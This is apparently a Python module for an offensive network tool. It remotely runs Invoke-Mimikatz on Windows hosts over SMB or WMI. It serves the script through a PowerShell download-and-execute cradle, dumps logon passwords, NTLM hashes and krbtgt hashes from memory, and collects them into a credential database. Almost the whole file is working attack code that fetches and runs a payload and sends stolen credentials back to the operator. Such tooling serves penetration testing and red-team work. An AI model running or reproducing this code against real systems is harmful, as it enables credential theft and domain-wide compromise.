from cmx.helpers.powershell import clean_ps_script, gen_ps_iex_cradle
from cmx.helpers.misc import validate_ntlm
from cmx.helpers.logger import write_log, highlight
from datetime import datetime
from cmx import config as cfg
import re
import pdb

class CMXModule:
    '''
        Executes Invoke-Mimikatz.ps1 script
        Mimikatz version: 2.2.0 20190408 ()

        Use https://gist.github.com/ihack4falafel/8b41d810d79cb16a4b1bca5ff6600b17 
        to build new invoke-mimikatz when ben releases

    '''

    name = 'mimikatz'
    description = "Dumps all logon credentials from memory"
    supported_protocols = ['smb','wmi']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
    Module Options:
           COMMAND  Mimikatz command to execute (default: 'privilege::debug sekurlsa::logonpasswords exit')

cmx --verbose smb 192.168.1.1 -u username -p password -M mimikatz -mo COMMAND='privilege::debug sekurlsa::logonpasswords exit'

        """
        self.command = 'privilege::debug sekurlsa::logonpasswords exit'
        if module_options and 'COMMAND' in module_options:
            self.command = module_options['COMMAND']
            

        self.ps_script = clean_ps_script('powershell_scripts/Invoke-Mimikatz.ps1')

    def on_admin_login(self, context, connection):
        command = "Invoke-Mimikatz -Command '{}'".format(self.command)

        launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command, server_os=connection.server_os)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script.encode()) #self.ps_script is the ps1 script itself

        else:
            request.send_response(404)
            request.end_headers()

    def uniquify_tuples(self, tuples):
        """
        uniquify mimikatz tuples based on the password
        cred format- (credType, domain, username, password, hostname, sid)

        Stolen from the Empire project.
        """
        seen = set()
        return [item for item in tuples if "{}{}{}{}".format(item[0],item[1],item[2],item[3]) not in seen and not seen.add("{}{}{}{}".format(item[0],item[1],item[2],item[3]))]

    def parse_mimikatz(self, data):
        """
        Parse the output from Invoke-Mimikatz to return credential sets.

        This was directly stolen from the Empire project as well.
        """

        # cred format:
        #   credType, domain, username, password, hostname, sid
        creds = []

        # regexes for "sekurlsa::logonpasswords" Mimikatz output
        regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)", "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)", "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)", "(?s)(?<=credman :).*?(?=mimikatz)"]

        hostDomain = ""
        domainSid = ""
        hostName = ""

        lines = data.decode().split("\n")
        for line in lines[0:2]:
            if line.startswith("Hostname:"):
                try:
                    domain = line.split(":")[1].strip()
                    temp = domain.split("/")[0].strip()
                    domainSid = domain.split("/")[1].strip()

                    hostName = temp.split(".")[0]
                    hostDomain = ".".join(temp.split(".")[1:])
                except:
                    pass

        for regex in regexes:

            p = re.compile(regex)

            for match in p.findall(data.decode()):

                lines2 = match.split("\n")
                username, domain, password = "", "", ""

                for line in lines2:
                    try:
                        if "Username" in line:
                            username = line.split(":",1)[1].strip()
                        elif "Domain" in line:
                            domain = line.split(":",1)[1].strip()
                        elif "NTLM" in line or "Password" in line:
                            password = line.split(":",1)[1].strip()
                    except:
                        pass

                if username != "" and password != "" and password != "(null)":

                    sid = ""

                    # substitute the FQDN in if it matches
                    if hostDomain.startswith(domain.lower()):
                        domain = hostDomain
                        sid = domainSid

                    if validate_ntlm(password):
                        credType = "hash"

                    else:
                        credType = "plaintext"

                    # ignore machine account plaintexts
                    if not (credType == "plaintext" and username.endswith("$")):
                        creds.append((credType, domain, username, password, hostName, sid))

        if len(creds) == 0:
            # check if we have lsadump output to check for krbtgt
            #   happens on domain controller hashdumps
            for x in range(8,13):
                if lines[x].startswith("Domain :"):

                    domain, sid, krbtgtHash = "", "", ""

                    try:
                        domainParts = lines[x].split(":")[1]
                        domain = domainParts.split("/")[0].strip()
                        sid = domainParts.split("/")[1].strip()

                        # substitute the FQDN in if it matches
                        if hostDomain.startswith(domain.lower()):
                            domain = hostDomain
                            sid = domainSid

                        for x in range(0, len(lines)):
                            if lines[x].startswith("User : krbtgt"):
                                krbtgtHash = lines[x+2].split(":")[1].strip()
                                break

                        if krbtgtHash != "":
                            creds.append(("hash", domain, "krbtgt", krbtgtHash, hostName, sid))
                    except Exception as e:
                        pass

        if len(creds) == 0:
            # check if we get lsadump::dcsync output
            if '** SAM ACCOUNT **' in lines:
                domain, user, userHash, dcName, sid = "", "", "", "", ""
                for line in lines:
                    try:
                        if line.strip().endswith("will be the domain"):
                            domain = line.split("'")[1]
                        elif line.strip().endswith("will be the DC server"):
                            dcName = line.split("'")[1].split(".")[0]
                        elif line.strip().startswith("SAM Username"):
                            user = line.split(":")[1].strip()
                        elif line.strip().startswith("Object Security ID"):
                            parts = line.split(":")[1].strip().split("-")
                            sid = "-".join(parts[0:-1])
                        elif line.strip().startswith("Hash NTLM:"):
                            userHash = line.split(":")[1].strip()
                    except:
                        pass

                if domain != "" and userHash != "":
                    creds.append(("hash", domain, user, userHash, dcName, sid))

        return self.uniquify_tuples(creds)

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('Content-Length'))
        data = response.rfile.read(length)

        # We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            if self.command.find('sekurlsa::logonpasswords') != -1:
                creds = self.parse_mimikatz(data)
                if len(creds):
                    for cred_set in creds:
                        credtype, domain, username, password,_,_ = cred_set
                        # Get the hostid from the DB
                        hostid = context.db.get_computers(response.client_address[0])[0][0]
                        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
                        context.log.highlight('{}\\{}:{}'.format(domain, username, password))

                    context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
            else:
                context.log.highlight(data)

                #cant use ':' in filename cause of windows 
            log_name = 'Mimikatz_against_{}_on_{}.log'.format(response.client_address[0], datetime.now().strftime("%b.%d.%y_at_%H%M"))
            write_log(str(data, 'utf-8'), log_name)
            context.log.info("Saved raw Mimikatz output to {}/{}".format(cfg.LOGS_PATH,log_name))